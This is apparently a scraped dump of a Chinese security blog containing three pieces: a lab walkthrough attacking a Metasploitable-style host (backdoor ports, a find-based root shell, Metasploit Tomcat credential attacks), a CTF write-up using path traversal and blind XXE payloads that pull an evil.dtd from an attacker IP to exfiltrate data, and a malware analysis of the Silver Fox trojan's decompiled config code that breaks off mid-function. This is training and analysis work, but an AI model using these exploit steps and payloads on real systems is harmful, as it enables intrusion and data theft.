find： find / -exec /bin/sh \\; -quit # 通过 find 执行 shell 获取 root vsftpd 2.3.4 后门的典型特征是触发后在目标 6200 端口开放 shell，Metasploit 模块会自动连接该端口并反弹会话。 端口3：1524——-ingrelock_backdoor利用telnet连接1524，直接返回root会话端口3、1524——-ingrelock_backdoor 利用telnet连接1524，直接返回root会话 端口4：1099——-distcc程序漏洞—-ingrelock利用metasploit 返回对话 端口5：139——-samba为3.0漏洞先用nmap进行详细扫描 1nmap -v -A -T4 192.168.195.133 metasploit有众多扫描模块，以适应不同的需要。在metasploit中同样可以使用nmap进行扫描。在命令行中直接键入指令即可。 Samba 利用metasploit 端口6、8180——-Apache Tomcat弱口令1234567891011121314在终端中输入命令“nmap 172.20.10.3”，对目标主机进行端口扫描，发现开放8180端口并且运行着ApacheTomcat/CoyoteJSP engine1.1。在终端中输入命令“msfconsole”，启动MSF终端。在终端下输入命令“search tomcat”, 搜索tomcat的相关工具和攻击载荷。在终端输入“use auxiliary/scanner/http/tomcat_mgr_login”， 启用漏洞利用模块, 提示符就会提示进入到该路径下。在终端下输入“set RHOSTS 172.20.10.3”,设置攻击目标主机IP。在终端下输入“set RPORT 8180”,设置攻击目标主机端口号.在终端下输入“exploit”, 实施攻击。获得用户名tomcat,密码tomcat。在终端下输入“use exploit/multi/http/tomcat_mgr_deploy”, 启用漏洞利用模块, 提示符就会提示进入到该路径下。在终端下输入“set RHOST 172.20.10.3”,设置攻击的目标主机IP。在终端下输入“set RPORT 8180”,设置攻击的目标主机端口号。在终端下输入“set username tomcat”,设置攻击时使用的登录账号tomcat。在终端下输入“set userpassword tomcat”,设置攻击时使用的密码tomcat。在终端下输入“exploit”,开始攻击，建立会话。在终端下输入“getuid”,查看获取的用户权限。 得到用户名密码分别为tomcat，tomcat 上面不成功 12set HttpUsername tomcatset HttpPassword tomcat 可能版本太老了，tomcat已经做出防护了 端口7、80——-PHP CGI参数注入执行漏洞 网站渗透前面不是dirsearch扫出来，phpinfo和tikiwi吗这里我们就对这两个域名进行操作 1![](https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635476602-85919f53-59fc-46d5-a201-15752a43b7e4.png)","link":"/2025/12/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/"},{"title":"","text":"网鼎杯 2020 青龙组–filejava 先上传随便一个文件，点下载抓包 看到?file 看到有一个路径，里面有WEB-INF，题目提示与java有关，那应该是web.xml文件泄露，尝试读取 Java Web目录结构 WEB-INF/web.xml：核心配置文件，映射Servlet类路径。WEB-INF/classes/：存放编译后的Java类文件。利用路径穿越（../../）可读取敏感文件。XXE漏洞原理 XML解析器未禁用外部实体时，可通过file://协议读取本地文件，或通过HTTP请求外带数据（Blind XXE）。Apache POI 3.10版本默认未禁用外部实体，导致漏洞。Excel文件结构 XLSX为ZIP压缩包，内含XML文件，修改[Content_Types].xml可注入恶意实体。漏洞利用链设计 文件上传 → 触发XXE → 外带数据 → 获取Flag。 1DownloadServlet?filename=../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml 1DownloadServlet?filename=../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/cn/abc/servlet/DownloadServlet.class 下载下来一个class文件反编译一下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124package cn.abc.servlet; import java.io.File; import java.io.FileInputStream; import java.io.IOException; import java.net.URLEncoder; import javax.servlet.ServletException; import javax.servlet.ServletOutputStream; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; /* loaded from: _.._.._.._.._.._.._.._.._usr_local_tomcat_webapps_ROOT_WEB-INF_classes_cn_abc_servlet_DownloadServlet.class */ public class DownloadServlet extends HttpServlet { private static final long serialVersionUID = 1; protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { doPost(request, response); } protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { String fileName = new String(request.getParameter(&quot;filename&quot;).getBytes(&quot;ISO8859-1&quot;), &quot;UTF-8&quot;); System.out.println(&quot;filename=&quot; + fileName); if (fileName != null &amp;&amp; fileName.toLowerCase().contains(&quot;flag&quot;)) { request.setAttribute(&quot;message&quot;, &quot;禁止读取&quot;); request.getRequestDispatcher(&quot;/message.jsp&quot;).forward(request, response); return; } String fileSaveRootPath = getServletContext().getRealPath(&quot;/WEB-INF/upload&quot;); String path = findFileSavePathByFileName(fileName, fileSaveRootPath); File file = new File(path + &quot;/&quot; + fileName); if (!file.exists()) { request.setAttribute(&quot;message&quot;, &quot;您要下载的资源已被删除!&quot;); request.getRequestDispatcher(&quot;/message.jsp&quot;).forward(request, response); return; } String realname = fileName.substring(fileName.indexOf(&quot;_&quot;) + 1); response.setHeader(&quot;content-disposition&quot;, &quot;attachment;filename=&quot; + URLEncoder.encode(realname, &quot;UTF-8&quot;)); FileInputStream in = new FileInputStream(path + &quot;/&quot; + fileName); ServletOutputStream out = response.getOutputStream(); byte[] buffer = new byte[1024]; while (true) { int len = in.read(buffer); if (len &gt; 0) { out.write(buffer, 0, len); } else { in.close(); out.close(); return; } } } public String findFileSavePathByFileName(String filename, String saveRootPath) { int hashCode = filename.hashCode(); int dir1 = hashCode &amp; 15; int dir2 = (hashCode &amp; 240) &gt;&gt; 4; String dir = saveRootPath + &quot;/&quot; + dir1 + &quot;/&quot; + dir2; File file = new File(dir); if (!file.exists()) { file.mkdirs(); } return dir; } } 1zip -r ./payload.xlsx ./excel-123456 1234python -m SimpleHTTPServer 4560netstat -tulnp | grep 4560kill pid evil.dtd 1&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM 'http://10.88.15.58:4560/%file;'&gt;&quot;&gt; 是服务器nc的端口 启动http服务在xlsx文件的 1234&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://10.88.15.58:4560/evil.dtd&quot;&gt;%remote;%int;%send;]&gt; 1234python -m SimpleHTTPServer 4560python -m http.server 4560","link":"/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84--filejava/"},{"title":"","text":"银狐木马样本深度分析与后门域名溯源tag:病毒分析 由于制做C2工具的黑客留下了后门，所以这个木马是有后门的，你能找到它的后门吗 WriteUpwmain函数 123456789101112131415161718__int64 wmain(){ HWND hWnd; // rax DWORD idThread; // eax SetUnhandledExceptionFilter(TopLevelExceptionFilter); hWnd = GetConsoleWindow(); ShowWindow(hWnd, 0); idThread = GetCurrentThreadId(); PostThreadMessageA(idThread, 0, 0, 0); GetInputState(); sub_140008750(); hObject = CreateThread(0, 0, sub_14000A440, 0, 0, 0); WaitForSingleObject(hObject, 0xFFFFFFFF); CloseHandle(hObject); Sleep(0x12Cu); return 0;} 先看sub_140008750函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739#sub_140008750函数int sub_140008750(){ _UNKNOWN **v0; // rax __int64 v1; // rbx int v2; // eax int v3; // r9d __int64 v4; // rdx int v5; // r10d __int64 i; // r8 int v7; // ecx __int64 v8; // rbx int v9; // eax int v10; // r9d __int64 v11; // rdx int v12; // r10d __int64 j; // r8 int v14; // ecx __int64 v15; // rbx int v16; // eax int v17; // r9d __int64 v18; // rdx int v19; // r10d __int64 k; // r8 int v21; // ecx __int64 v22; // rbx int v23; // eax int v24; // r9d __int64 v25; // rdx int v26; // r10d __int64 m; // r8 int v28; // ecx __int64 v29; // rbx int v30; // eax int v31; // r9d __int64 v32; // rdx int v33; // r10d __int64 n; // r8 int v35; // ecx __int64 v36; // rbx int v37; // eax int v38; // r9d __int64 v39; // rdx int v40; // r10d __int64 ii; // r8 int v42; // ecx __int64 v43; // rbx int v44; // eax int v45; // r9d __int64 v46; // rdx int v47; // r10d __int64 jj; // r8 int v49; // ecx __int64 v50; // rbx int v51; // eax int v52; // r9d __int64 v53; // rdx int v54; // r10d __int64 kk; // r8 int v56; // ecx __int64 v57; // rbx int v58; // eax int v59; // r9d __int64 v60; // rdx int v61; // r10d __int64 mm; // r8 int v63; // ecx __int64 v64; // rbx int v65; // eax int v66; // r9d __int64 v67; // rdx int v68; // r10d __int64 nn; // r8 int v70; // ecx __int64 v71; // rbx int v72; // eax int v73; // r9d __int64 v74; // rdx int v75; // r10d __int64 i1; // r8 int v77; // ecx __int64 v78; // rbx int v79; // eax int v80; // r9d __int64 v81; // rdx int v82; // r10d __int64 i2; // r8 __int64 v84; // rbx int v85; // eax int v86; // r9d __int64 v87; // rdx int v88; // r10d __int64 i3; // r8 int v90; // ecx int v91; // ecx __int64 v92; // rbx int v93; // r9d __int64 v94; // rdx __int64 v95; // rsi int v96; // r10d __int64 v97; // r8 int v98; // ecx _UNKNOWN *retaddr; // [rsp+68h] [rbp+0h] BYREF DWORD cbData; // [rsp+70h] [rbp+8h] BYREF DWORD Type; // [rsp+78h] [rbp+10h] BYREF HKEY hKey; // [rsp+80h] [rbp+18h] BYREF v0 = &amp;retaddr; if ( !byte_140060708 ) { byte_140060708 = 1; wcsrev(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; memset(&amp;Src, 0, 0x12A0u); sub_140008620(L&quot;p1:&quot;, &amp;Source); sub_140008620(L&quot;o1:&quot;, &amp;Source__1); v1 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v2 = lstrlenW(L&quot;t1:&quot;); v3 = 0; v4 = 0; if ( (int)v1 &gt; 0 ) { while ( 1 ) { v5 = 0; for ( i = 0; i &lt; v2; ++v5 ) { if ( a0Db0Lk0Hs0Ld0L[v4 + i] != aT1[i] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++i; } if ( v5 == v2 ) { v4 += v2; v3 += v2; if ( v4 &lt; v1 ) break; }LABEL_10: ++v4; ++v3; if ( v4 &gt;= v1 ) goto LABEL_15; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v4] != 124 ) { ++v4; ++v3; if ( v4 &gt;= v1 ) goto LABEL_10; } v7 = dword_14005F6A8; if ( a0Db0Lk0Hs0Ld0L[v3 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v7 = 1; dword_14005F6A8 = v7; }LABEL_15: sub_140008620(L&quot;p2:&quot;, &amp;Source_); sub_140008620(L&quot;o2:&quot;, &amp;Source__0); v8 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v9 = lstrlenW(L&quot;t2:&quot;); v10 = 0; v11 = 0; if ( (int)v8 &gt; 0 ) { while ( 1 ) { v12 = 0; for ( j = 0; j &lt; v9; ++v12 ) { if ( a0Db0Lk0Hs0Ld0L[v11 + j] != aT2[j] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++j; } if ( v12 == v9 ) { v11 += v9; v10 += v9; if ( v11 &lt; v8 ) break; }LABEL_23: ++v11; ++v10; if ( v11 &gt;= v8 ) goto LABEL_28; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v11] != 124 ) { ++v11; ++v10; if ( v11 &gt;= v8 ) goto LABEL_23; } v14 = dword_14005F8E8; if ( a0Db0Lk0Hs0Ld0L[v10 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v14 = 1; dword_14005F8E8 = v14; }LABEL_28: sub_140008620(L&quot;p3:&quot;, &amp;Source__2); sub_140008620(L&quot;o3:&quot;, &amp;Source__3); v15 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v16 = lstrlenW(L&quot;t3:&quot;); v17 = 0; v18 = 0; if ( (int)v15 &gt; 0 ) { while ( 1 ) { v19 = 0; for ( k = 0; k &lt; v16; ++v19 ) { if ( a0Db0Lk0Hs0Ld0L[v18 + k] != aT3[k] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++k; } if ( v19 == v16 ) { v18 += v16; v17 += v16; if ( v18 &lt; v15 ) break; }LABEL_36: ++v18; ++v17; if ( v18 &gt;= v15 ) goto LABEL_41; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v18] != 124 ) { ++v18; ++v17; if ( v18 &gt;= v15 ) goto LABEL_36; } v21 = dword_14005FB28; if ( a0Db0Lk0Hs0Ld0L[v17 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v21 = 1; dword_14005FB28 = v21; }LABEL_41: sub_140008620(L&quot;dd:&quot;, &amp;Destination__0); sub_140008620(L&quot;cl:&quot;, &amp;Destination__1); sub_140008620(L&quot;fz:&quot;, &amp;unk_14005FBA4); sub_140008620(L&quot;bb:&quot;, &amp;unk_14005FC08); sub_140008620(L&quot;bz:&quot;, &amp;unk_14005FC6C); v22 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v23 = lstrlenW(L&quot;jp:&quot;); v24 = 0; v25 = 0; if ( (int)v22 &gt; 0 ) { while ( 1 ) { v26 = 0; for ( m = 0; m &lt; v23; ++v26 ) { if ( a0Db0Lk0Hs0Ld0L[v25 + m] != aJp[m] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++m; } if ( v26 == v23 ) { v25 += v23; v24 += v23; if ( v25 &lt; v22 ) break; }LABEL_49: ++v25; ++v24; if ( v25 &gt;= v22 ) goto LABEL_54; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v25] != 124 ) { ++v25; ++v24; if ( v25 &gt;= v22 ) goto LABEL_49; } v28 = dword_14005FCD0; if ( a0Db0Lk0Hs0Ld0L[v24 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v28 = 1; dword_14005FCD0 = v28; }LABEL_54: v29 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v30 = lstrlenW(L&quot;sx:&quot;); v31 = 0; v32 = 0; if ( (int)v29 &gt; 0 ) { while ( 1 ) { v33 = 0; for ( n = 0; n &lt; v30; ++v33 ) { if ( a0Db0Lk0Hs0Ld0L[v32 + n] != aSx[n] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++n; } if ( v33 == v30 ) { v32 += v30; v31 += v30; if ( v32 &lt; v29 ) break; }LABEL_62: ++v32; ++v31; if ( v32 &gt;= v29 ) goto LABEL_67; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v32] != 124 ) { ++v32; ++v31; if ( v32 &gt;= v29 ) goto LABEL_62; } v35 = dword_14005FCD4; if ( a0Db0Lk0Hs0Ld0L[v31 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v35 = 1; dword_14005FCD4 = v35; }LABEL_67: v36 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v37 = lstrlenW(L&quot;bh:&quot;); v38 = 0; v39 = 0; if ( (int)v36 &gt; 0 ) { while ( 1 ) { v40 = 0; for ( ii = 0; ii &lt; v37; ++v40 ) { if ( a0Db0Lk0Hs0Ld0L[v39 + ii] != aBh[ii] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++ii; } if ( v40 == v37 ) { v39 += v37; v38 += v37; if ( v39 &lt; v36 ) break; }LABEL_75: ++v39; ++v38; if ( v39 &gt;= v36 ) goto LABEL_80; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v39] != 124 ) { ++v39; ++v38; if ( v39 &gt;= v36 ) goto LABEL_75; } v42 = dword_14005FCD8; if ( a0Db0Lk0Hs0Ld0L[v38 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v42 = 1; dword_14005FCD8 = v42; }LABEL_80: v43 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v44 = lstrlenW(L&quot;ll:&quot;); v45 = 0; v46 = 0; if ( (int)v43 &gt; 0 ) { while ( 1 ) { v47 = 0; for ( jj = 0; jj &lt; v44; ++v47 ) { if ( a0Db0Lk0Hs0Ld0L[v46 + jj] != aLl[jj] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++jj; } if ( v47 == v44 ) { v46 += v44; v45 += v44; if ( v46 &lt; v43 ) break; }LABEL_88: ++v46; ++v45; if ( v46 &gt;= v43 ) goto LABEL_93; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v46] != 124 ) { ++v46; ++v45; if ( v46 &gt;= v43 ) goto LABEL_88; } v49 = dword_14005FCDC; if ( a0Db0Lk0Hs0Ld0L[v45 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v49 = 1; dword_14005FCDC = v49; }LABEL_93: v50 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v51 = lstrlenW(L&quot;dl:&quot;); v52 = 0; v53 = 0; if ( (int)v50 &gt; 0 ) { while ( 1 ) { v54 = 0; for ( kk = 0; kk &lt; v51; ++v54 ) { if ( a0Db0Lk0Hs0Ld0L[v53 + kk] != aDl[kk] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++kk; } if ( v54 == v51 ) { v53 += v51; v52 += v51; if ( v53 &lt; v50 ) break; }LABEL_101: ++v53; ++v52; if ( v53 &gt;= v50 ) goto LABEL_106; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v53] != 124 ) { ++v53; ++v52; if ( v53 &gt;= v50 ) goto LABEL_101; } v56 = dword_14005FCE0; if ( a0Db0Lk0Hs0Ld0L[v52 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v56 = 1; dword_14005FCE0 = v56; }LABEL_106: v57 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v58 = lstrlenW(L&quot;sh:&quot;); v59 = 0; v60 = 0; if ( (int)v57 &gt; 0 ) { while ( 1 ) { v61 = 0; for ( mm = 0; mm &lt; v58; ++v61 ) { if ( a0Db0Lk0Hs0Ld0L[v60 + mm] != aSh[mm] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++mm; } if ( v61 == v58 ) { v60 += v58; v59 += v58; if ( v60 &lt; v57 ) break; }LABEL_114: ++v60; ++v59; if ( v60 &gt;= v57 ) goto LABEL_119; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v60] != 124 ) { ++v60; ++v59; if ( v60 &gt;= v57 ) goto LABEL_114; } v63 = dword_14005FCE4; if ( a0Db0Lk0Hs0Ld0L[v59 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v63 = 1; dword_14005FCE4 = v63; }LABEL_119: v64 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v65 = lstrlenW(L&quot;kl:&quot;); v66 = 0; v67 = 0; if ( (int)v64 &gt; 0 ) { while ( 1 ) { v68 = 0; for ( nn = 0; nn &lt; v65; ++v68 ) { if ( a0Db0Lk0Hs0Ld0L[v67 + nn] != aKl[nn] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++nn; } if ( v68 == v65 ) { v67 += v65; v66 += v65; if ( v67 &lt; v64 ) break; }LABEL_127: ++v67; ++v66; if ( v67 &gt;= v64 ) goto LABEL_132; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v67] != 124 ) { ++v67; ++v66; if ( v67 &gt;= v64 ) goto LABEL_127; } v70 = dword_14005FCE8; if ( a0Db0Lk0Hs0Ld0L[v66 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v70 = 1; dword_14005FCE8 = v70; }LABEL_132: v71 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v72 = lstrlenW(L&quot;bd:&quot;); v73 = 0; v74 = 0; if ( (int)v71 &gt; 0 ) { while ( 1 ) { v75 = 0; for ( i1 = 0; i1 &lt; v72; ++v75 ) { if ( a0Db0Lk0Hs0Ld0L[v74 + i1] != aBd[i1] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++i1; } if ( v75 == v72 ) { v74 += v72; v73 += v72; if ( v74 &lt; v71 ) break; }LABEL_140: ++v74; ++v73; if ( v74 &gt;= v71 ) goto LABEL_145; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v74] != 124 ) { ++v74; ++v73; if ( v74 &gt;= v71 ) goto LABEL_140; } v77 = dword_14005FCEC; if ( a0Db0Lk0Hs0Ld0L[v73 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v77 = 1; dword_14005FCEC = v77; }LABEL_145: Type = 3; cbData = 0; LODWORD(v0) = RegOpenKeyExW(HKEY_CURRENT_USER, L&quot;Console&quot;, 0, 0x20019u, &amp;hKey); if ( !(_DWORD)v0 ) LODWORD(v0) = RegQueryValueExW(hKey, L&quot;IpDate&quot;, 0, &amp;Type, 0, &amp;cbData); if ( cbData &gt; 0xA ) { memset(a0Db0Lk0Hs0Ld0L, 0, 0x7D0u); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; RegQueryValueExW(hKey, L&quot;IpDate&quot;, 0, &amp;Type, (LPBYTE)a0Db0Lk0Hs0Ld0L, &amp;cbData);// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; sub_140008620(L&quot;p1:&quot;, &amp;Source); sub_140008620(L&quot;o1:&quot;, &amp;Source__1); v78 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v79 = lstrlenW(L&quot;t1:&quot;); v80 = 0; v81 = 0; if ( (int)v78 &gt; 0 ) { while ( 1 ) { v82 = 0; for ( i2 = 0; i2 &lt; v79; ++v82 ) { if ( a0Db0Lk0Hs0Ld0L[v81 + i2] != aT1[i2] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++i2; } if ( v82 == v79 ) { v81 += v79; v80 += v79; if ( v81 &lt; v78 ) break; }LABEL_156: ++v81; ++v80; if ( v81 &gt;= v78 ) goto LABEL_157; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v81] != 124 ) { ++v81; ++v80; if ( v81 &gt;= v78 ) goto LABEL_156; } v90 = dword_14005F6A8; if ( a0Db0Lk0Hs0Ld0L[v80 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v90 = 1; dword_14005F6A8 = v90; }LABEL_157: sub_140008620(L&quot;p2:&quot;, &amp;Source_); sub_140008620(L&quot;o2:&quot;, &amp;Source__0); v84 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v85 = lstrlenW(L&quot;t2:&quot;); v86 = 0; v87 = 0; if ( (int)v84 &gt; 0 ) { while ( 1 ) { v88 = 0; for ( i3 = 0; i3 &lt; v85; ++v88 ) { if ( a0Db0Lk0Hs0Ld0L[v87 + i3] != aT2[i3] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++i3; } if ( v88 == v85 ) { v87 += v85; v86 += v85; if ( v87 &lt; v84 ) break; }LABEL_165: ++v87; ++v86; if ( v87 &gt;= v84 ) goto LABEL_173; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v87] != 124 ) { ++v87; ++v86; if ( v87 &gt;= v84 ) goto LABEL_165; } v91 = dword_14005F8E8; if ( a0Db0Lk0Hs0Ld0L[v86 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v91 = 1; dword_14005F8E8 = v91; }LABEL_173: sub_140008620(L&quot;p3:&quot;, &amp;Source__2); sub_140008620(L&quot;o3:&quot;, &amp;Source__3); v92 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; LODWORD(v0) = lstrlenW(L&quot;t3:&quot;); v93 = 0; v94 = 0; v95 = (int)v0; if ( (int)v92 &gt; 0 ) { while ( 1 ) { v96 = 0; 